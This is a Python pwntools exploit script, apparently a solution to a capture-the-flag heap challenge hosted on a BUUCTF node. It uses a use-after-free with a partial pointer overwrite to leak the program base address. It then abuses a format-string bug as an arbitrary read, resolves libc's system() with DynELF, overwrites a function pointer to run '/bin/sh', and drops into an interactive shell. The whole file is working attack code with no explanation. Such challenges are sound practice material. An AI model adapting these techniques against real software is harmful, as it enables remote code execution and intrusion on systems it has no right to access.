from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']
name = './pwn-f'
# p = process(name)
p=remote('node5.buuoj.cn', 27714)
elf= ELF(name)
#libc = ELF('./libc_32.so.6')
if args.G:
    gdb.attach(p)

# puts_offset = 0xd1a 
# printf_pffset = 0xdbb
def create(num,data):
    p.recvuntil('3.quit\n')
    p.sendline('create ')
    p.recvuntil('Pls give string size:')
    p.sendline(str(num))
    p.recvuntil('str:')
    p.send(data)
    
def delete(num):
    p.recvuntil('3.quit\n')
    p.sendline('delete ')
    p.recvuntil('id:')
    p.sendline(str(num))
    p.recvuntil('Are you sure?:')
    p.send("yes")

def leak(addr):
    delete(0)
    pay1 = 'aaaaaaaa' + '%9$s' + 'q'*12 + p64(printf_addr)
    create(32,pay1)
    pay =  'yes11111' +  p64(addr)
    p.recvuntil('3.quit\n')
    p.sendline('delete ')
    p.recvuntil('id:')
    p.sendline('1')
    p.recvuntil('Are you sure?:')
    p.sendline(pay)
    p.recvuntil('aaaaaaaa')
    context = p.recvuntil('qq')[:-2] + "\x00"
    print("%#x -> %s" %(addr, (context or '').encode('hex')))
    return context
    
    
create(5,'a'*5)
create(5,'b'*5)

delete(1)
delete(0)

pay1 = 'q'*20 + 's'*4 + '\x1a'
create(32,pay1)
delete(1)
#find proc_base printf_addr
p.recvuntil('s'*4)
puts_addr = u64(p.recv(6) + '\x00\x00')
proc_base = puts_addr - 0xd1a 
printf_addr = proc_base + 0x9d0
#leak
d = DynELF(leak,proc_base,elf = elf)
system_addr = d.lookup('system','libc')

p.sendline('')
delete(0)
pay3 = '/bin/sh;' + 's'*0x10 + p64(system_addr) 
create(32,pay3)
delete(1)

success("proc_base: " + hex(proc_base))
success("puts_addr: " + hex(puts_addr))
success("printf_addr: " + hex(printf_addr))
success("system_addr: " + hex(system_addr))

p.interactive()